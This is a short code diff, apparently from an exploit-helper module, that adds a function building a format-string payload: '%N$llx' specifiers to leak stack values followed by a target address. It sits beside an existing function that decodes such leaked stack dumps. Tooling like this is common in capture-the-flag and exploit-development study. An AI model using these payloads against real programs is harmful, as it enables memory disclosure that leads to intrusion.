@@ -10,3 +10,8 @@ def read_stack_dump(dump):
     for x in dump.split(b"."):
         out += a2b_hex(x)[::-1]
     return out.split(b"\0")
+
+
+def fmtstr_read(addr, n=10):
+    pl = b"".join([bytes("%{}$llx.".format(x), 'ascii') for x in range(8, 8 + n)])
+    return pl + b"\\.DIV.." + addr
